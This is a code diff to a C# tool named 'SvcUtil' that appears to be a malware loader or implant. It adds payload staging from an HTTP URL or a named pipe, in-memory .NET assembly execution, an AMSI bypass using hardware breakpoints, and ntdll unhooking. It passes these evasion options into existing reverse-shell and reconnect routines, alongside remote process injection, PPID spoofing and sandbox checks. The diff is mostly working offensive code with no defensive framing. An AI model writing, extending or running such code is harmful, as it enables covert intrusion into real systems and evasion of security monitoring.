@@ -21,6 +21,8 @@ namespace SvcUtil
         private static bool _scanExplicit;
         private static bool _useTls;
         private static string _payloadB64;
+        private static string _stageUrl;
+        private static string _stagePipe;
         private static string _aesPassword;
 #if INJECT
         private static int _targetPid;
@@ -28,6 +30,10 @@ namespace SvcUtil
         private static int _ppidSpoof;
 #endif
         private static bool _noSandbox;
+        private static bool _scanHwBp;
+        private static bool _unhookNtdll;
+        private static bool _execAsm;
+        private static string[] _asmArgs;
 
         static void Main(string[] args)
         {
@@ -43,6 +49,8 @@ namespace SvcUtil
             _scanExplicit = false;
             _useTls = false;
             _payloadB64 = null;
+            _stageUrl = null;
+            _stagePipe = null;
             _aesPassword = null;
 #if INJECT
             _targetPid = 0;
@@ -50,6 +58,10 @@ namespace SvcUtil
             _ppidSpoof = 0;
 #endif
             _noSandbox = false;
+            _scanHwBp = false;
+            _unhookNtdll = false;
+            _execAsm = false;
+            _asmArgs = new string[0];
 
             if (!ParseArgs(args))
                 return;
@@ -60,20 +72,34 @@ namespace SvcUtil
                 return;
 #endif
 
+            // --exec-asm requires a payload source
+            if (_execAsm && _payloadB64 == null &&
+                _stageUrl == null && _stagePipe == null)
+                return;
+
+            // Resolve payload from any source
+            byte[] payload = null;
+
             if (_payloadB64 != null)
+            {
+                try { payload = Convert.FromBase64String(_payloadB64); }
+                catch { return; }
+            }
+            else if (_stageUrl != null)
+            {
+                payload = Stager.FromHttp(_stageUrl);
+                if (payload == null) return; // Download failed
+            }
+            else if (_stagePipe != null)
+            {
+                payload = Stager.FromPipe(_stagePipe);
+                if (payload == null) return; // Pipe read failed
+            }
+
+            if (payload != null)
             {
                 if (!_noSandbox && !Env.Go())
                     return;
-
-                byte[] payload;
-                try
-                {
-                    payload = Convert.FromBase64String(_payloadB64);
-                }
-                catch
-                {
-                    return; // Invalid base64 — silent fail
-                }
 
                 // AES decryption if password provided
                 if (_aesPassword != null)
@@ -90,8 +116,13 @@ namespace SvcUtil
 
                 try
                 {
+                    if (_execAsm)
+                    {
+                        // In-memory .NET assembly execution
+                        AsmExec.Run(payload, _asmArgs);
+                    }
 #if INJECT
-                    if (_targetPid > 0)
+                    else if (_targetPid > 0)
                     {
                         // Remote injection — choose method
                         bool injected;
@@ -208,6 +239,11 @@ namespace SvcUtil
                         _scanExplicit = true;
                         break;
 
+                    case "--amsi-hw":
+                        _scanHwBp = true;
+                        _scanExplicit = true;
+                        break;
+
                     case "--tls":
                         _useTls = true;
                         break;
@@ -220,6 +256,16 @@ namespace SvcUtil
                             _payloadB64 = File.ReadAllText(sArg).Trim();
                         else
                             _payloadB64 = sArg;
+                        break;
+
+                    case "--stage-http":
+                        if (i + 1 >= args.Length) return false;
+                        _stageUrl = args[++i];
+                        break;
+
+                    case "--stage-pipe":
+                        if (i + 1 >= args.Length) return false;
+                        _stagePipe = args[++i];
                         break;
 
                     case "-p":
@@ -269,6 +315,22 @@ namespace SvcUtil
                         break;
 #endif
 
+                    case "--exec-asm":
+                        _execAsm = true;
+                        break;
+
+                    case "--":
+                        // Everything after -- becomes assembly args
+                        var remaining = new System.Collections.Generic.List<string>();
+                        for (int j = i + 1; j < args.Length; j++)
+                            remaining.Add(args[j]);
+                        _asmArgs = remaining.ToArray();
+                        return true;
+
+                    case "--unhook":
+                        _unhookNtdll = true;
+                        break;
+
                     case "--no-sandbox":
                         _noSandbox = true;
                         break;
@@ -302,7 +364,7 @@ namespace SvcUtil
             IShellStream stream = CreateStream(sock);
             if (stream == null) return;
 
-            Shell.Execute(_command, stream, _scanPatch);
+            Shell.Execute(_command, stream, _scanPatch, _scanHwBp, _unhookNtdll);
         }
 
         private static void RunReverseWithReconnect()
@@ -316,7 +378,7 @@ namespace SvcUtil
                 IShellStream stream = CreateStream(sock);
                 if (stream == null) return;
 
-                Shell.Execute(_command, stream, _scanPatch);
+                Shell.Execute(_command, stream, _scanPatch, _scanHwBp, _unhookNtdll);
             }
         }
 
@@ -328,7 +390,7 @@ namespace SvcUtil
             IShellStream stream = CreateStream(sock);
             if (stream == null) return;
 
-            Shell.Execute(_command, stream, _scanPatch);
+            Shell.Execute(_command, stream, _scanPatch, _scanHwBp, _unhookNtdll);
         }
 
         /// <summary>
